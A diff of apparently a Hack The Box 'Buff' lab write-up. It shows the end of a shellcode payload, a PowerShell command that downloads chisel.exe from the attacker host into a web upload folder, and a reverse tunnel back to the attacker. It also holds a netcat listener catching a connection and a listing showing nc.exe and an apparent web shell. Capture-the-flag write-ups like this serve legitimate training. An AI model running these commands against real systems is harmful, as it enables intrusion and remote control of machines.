@@ -523,12 +523,53 @@ payload += b"\xa6\x0f\x9e\xad\xda\xaf\x61\x64\x5f\xdf\x2b\x24"
 payload += b"\xf6\x48\xf2\xbd\x4a\x15\x05\x68\x88\x20\x86\x98"
 payload += b"\x71\xd7\x96\xe9\x74\x93\x10\x02\x05\x8c\xf4\x24"
 payload += b"\xba\xad\xdc"
-
-
+```
+* Use chisel for port forwarding
+```
 powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
-chisel_1.7.2_windows_386
+C:\xampp\htdocs\gym\upload>powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
+
+C:\xampp\htdocs\gym\upload>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\xampp\htdocs\gym\upload
+
+10/11/2020  05:23    <DIR>          .
+10/11/2020  05:23    <DIR>          ..
+10/11/2020  05:25         7,490,048 chisel.exe
+10/11/2020  05:19                53 kamehameha.php
+10/11/2020  05:22            59,392 nc.exe
+               3 File(s)      7,549,493 bytes
+               2 Dir(s)   7,117,021,184 bytes free
+
+C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.10:8000 R:8888:127.0.0.1:8888
+chisel.exe client 10.10.14.10:8000 R:8888:127.0.0.1:8888
+2020/11/10 05:26:18 client: Connecting to ws://10.10.14.10:8000
+2020/11/10 05:26:19 client: Retrying in 100ms...
+2020/11/10 05:26:20 client: Retrying in 200ms...
+2020/11/10 05:26:21 client: Retrying in 400ms...
+2020/11/10 05:26:23 client: Retrying in 800ms...
+2020/11/10 05:26:25 client: Retrying in 1.6s...
+2020/11/10 05:26:27 client: Retrying in 3.2s...
+2020/11/10 05:26:32 client: Retrying in 6.4s...
+2020/11/10 05:26:39 client: Retrying in 12.8s...
+2020/11/10 05:26:53 client: Retrying in 25.6s...
+2020/11/10 05:27:19 client: Fingerprint e3:8c:29:b2:dc:9a:a3:6a:2b:1b:9c:28:53:72:ed:55
+2020/11/10 05:27:19 client: Connected (Latency 22.5745ms)
 
 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+kali@kali:~/HTB/buff$ chisel server --port 8000 --reverse
+2020/11/10 00:27:05 server: Reverse tunnelling enabled
+2020/11/10 00:27:05 server: Fingerprint e3:8c:29:b2:dc:9a:a3:6a:2b:1b:9c:28:53:72:ed:55
+2020/11/10 00:27:05 server: Listening on http://0.0.0.0:8000
+2020/11/10 00:27:20 server: session#1: tun: proxy#R:8888=>8888: Listening
+```
+
+```
 kali@kali:~/HTB/buff$ nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.10.10.198] 49777
